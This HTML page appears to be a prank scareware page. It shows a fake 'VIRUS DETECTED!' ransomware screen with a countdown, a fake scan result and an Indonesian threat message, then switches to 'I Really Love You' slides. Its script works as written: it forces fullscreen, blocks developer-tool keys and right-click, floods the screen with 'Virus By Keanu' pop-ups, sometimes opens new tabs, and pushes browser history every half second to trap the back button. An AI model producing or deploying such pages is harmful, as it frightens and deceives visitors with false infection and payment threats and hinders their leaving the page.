<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WARNING: System Compromised</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="%23ff6b6b"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>'), auto;
        }

        body {
            overflow-x: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            display: flex;
            flex: 1;
            transition: transform 0.5s ease;
        }

        .slide {
            min-width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            padding: 20px;
            background-color: #000;
        }

        .slide1 {
            background-image: url('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/e8061642-f05e-489b-8743-17b31d2fc3e4.png');
            color: #ff0000;
        }

        .slide2 {
            background-image: url('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/6cd0f380-e022-4357-a1a3-f7acebc83548.png');
            color: #ff5050;
        }

        .slide3 {
            background-image: url('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/75a8176e-87fb-4454-91b5-b95a050cc200.png');
            color: #ff5050;
        }

        .love-box {
            background-color: white;
            padding: 30px 60px;
            border-radius: 15px;
            box-shadow: 0 20px 35px rgba(0,0,0,0.2), 0 0 10px rgba(255, 0, 100, 0.6);
            text-align: center;
            margin-bottom: 30px;
        }

        .love-box h1 {
            color: #ff6b6b;
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .continue-btn {
            padding: 12px 30px;
            background-color: #6c5ce7;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .continue-btn:hover {
            background-color: #5649c0;
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
        }

        @media (max-width: 768px) {
            .love-box {
                padding: 20px 40px;
                width: 90%;
            }

            .love-box h1 {
                font-size: 2rem;
            }

            .continue-btn {
                padding: 10px 25px;
                font-size: 1rem;
            }
        }

        @media (max-width: 480px) {
            .love-box h1 {
                font-size: 1.8rem;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="slider">
        <div class="slide slide1">
            <div class="love-box" style="background: rgba(20,20,20,0.8);">
                <h1 style="color:red;"><span id="ransomText">VIRUS DETECTED!</span></h1>
                <p style="color:white;">Your smartphone has been infected with malware encrypted</p>
                <p style="color:white;">System files corrupted</p>
                <p style="color:white;" id="countdown">Scanning device... 15% complete</p>
            </div>
            <button class="continue-btn" onclick="showPaymentDetails()">Payment Instructions</button>
        </div>
        <div class="slide slide2">
            <div class="love-box">
                <h1>I Really Love You</h1>
                <p>You're amazing!</p>
            </div>
            <button class="continue-btn" onclick="nextSlide()">Continue</button>
        </div>
        <div class="slide slide3">
            <div class="love-box">
                <h1>I Love You So Much</h1>
                <p>Thank you for visiting!</p>
            </div>
            <button class="continue-btn" onclick="resetSlider()">Start Over</button>
        </div>
    </div>

    <script>
        // Prevent exit behaviors
        document.addEventListener('keydown', function(e) {
            if(e.key === 'F12' || 
               (e.ctrlKey && e.shiftKey && e.key === 'I') || 
               (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
                alert('Developer tools disabled!');
            }
        });

        let currentSlide = 0;
        const slider = document.getElementById('slider');
        
        // Open fullscreen automatically
        function openFullscreen() {
            try {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
                } else if (document.documentElement.webkitRequestFullscreen) {
                    document.documentElement.webkitRequestFullscreen();
                }
            } catch(e) {}
        }
        openFullscreen();
        
        // Ransomware simulation
        let countdown = 48 * 60 * 60; // 48 hours in seconds
        
        function updateCountdown() {
            const hours = Math.floor(countdown / 3600);
            const minutes = Math.floor((countdown % 3600) / 60);
            const seconds = countdown % 60;
            document.getElementById('countdown').textContent = 
                `Time remaining: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (countdown > 0) {
                countdown--;
                setTimeout(updateCountdown, 1000);
            } else {
                document.getElementById('countdown').textContent = "TIME EXPIRED! Files will now be deleted!";
            }
        }
        
        function showPaymentDetails() {
            alert("WARNING: Malicious activity detected\n\nSmartPhone mu sudah berada ditangan kemzi");
        }

        // Fake scanning animation
        function runFakeScan() {
            let progress = 15;
            const scanInterval = setInterval(() => {
                progress += Math.random() * 10;
                if(progress > 95) progress = 95;
                document.getElementById('countdown').textContent = 
                    `Scanning device... ${Math.floor(progress)}% complete`;
                
                if(progress >= 95) {
                    clearInterval(scanInterval);
                    document.getElementById('countdown').textContent = 
                        "Scan complete: 75093 infected files found";
                }
            }, 1000);
        }
        runFakeScan();
        const totalSlides = document.querySelectorAll('.slide').length;
        const loveBoxes = document.querySelectorAll('.love-box');

        function animateBoxes() {
            loveBoxes.forEach(box => {
                box.style.transform = 'scale(0.9)';
                setTimeout(() => {
                    box.style.transform = 'scale(1)';
                }, 300);
            });
        }

        function nextSlide() {
            animateBoxes();
            if (currentSlide < totalSlides - 1) {
                currentSlide++;
                slider.style.transform = `translateX(-${currentSlide * 100}vw)`;
            }
        }

        function resetSlider() {
            currentSlide = 0;
            slider.style.transform = 'translateX(0)';
        }

        // Touch events for mobile swipe
        let touchStartX = 0;
        let touchEndX = 0;

        document.addEventListener('touchstart', e => {
            touchStartX = e.changedTouches[0].screenX;
        });

        document.addEventListener('touchend', e => {
            touchEndX = e.changedTouches[0].screenX;
            handleSwipe();
        });

        function handleSwipe() {
            if (touchEndX < touchStartX) {
                nextSlide();
            }
            if (touchEndX > touchStartX && currentSlide > 0) {
                currentSlide--;
                slider.style.transform = `translateX(-${currentSlide * 100}vw)`;
            }
        }

        // Create random spam alerts
        function showRandomSpam() {
            const messages = [
                "Virus By Keanu",
                "Virus By Keanu",
                "Virus By Keanu",
                "Virus By Keanu",
                "Virus By Keanu",
                "Virus By Keanu",
                "Virus By Keanu", 
                "Virus By Keanu",
                "Virus By Keanu"
            ];
            
            const spam = document.createElement('div');
            spam.textContent = messages[Math.floor(Math.random() * messages.length)];
            spam.style.position = 'fixed';
            spam.style.top = Math.random() * 60 + '%';
            spam.style.left = Math.random() * 60 + '%';
            spam.style.color = 'red';
            spam.style.fontSize = '24px';
            spam.style.zIndex = '99999';
            spam.style.textShadow = '0 0 5px white';
            document.body.appendChild(spam);
            
            setTimeout(() => {
                spam.remove();
            }, 3000);
            
            if(Math.random() > 0.7) {
                setTimeout(() => {
                    window.open('about:blank', '_blank');
                    document.title = "⚠️ WARNING: INFECTED ⚠️";
                }, 100);
            }
        }
        setInterval(showRandomSpam, 3000);

        // Add to style section
        document.head.insertAdjacentHTML('beforeend', `
            <style>
                @keyframes float {
                    0% { transform: translateY(0) rotate(0deg); }
                    100% { transform: translateY(calc(100vh + 20px)) rotate(360deg); }
                }
            </style>
        `);

        // Disable right click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert('Right click disabled!');
        });

        // Spam browser history
        function spamHistory() {
            history.pushState(null, null, window.location.href + '?virus_detected=' + Date.now());
            setTimeout(spamHistory, 500);
        }
        spamHistory();

        function updateBackgrounds() {
            const slides = document.querySelectorAll('.click');
            for (let i = 0; i < 10; i++) {
                const fileInput = document.getElementById(`photo${i+10}`);
                if (fileInput.files && fileInput.files[0]) {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        slides[i].style.background = `url(${e.target.result}) center/cover`;
                    };
                    reader.readAsDataURL(fileInput.files[0]);
                }
            }
        }
    </script>
</body>
</html>
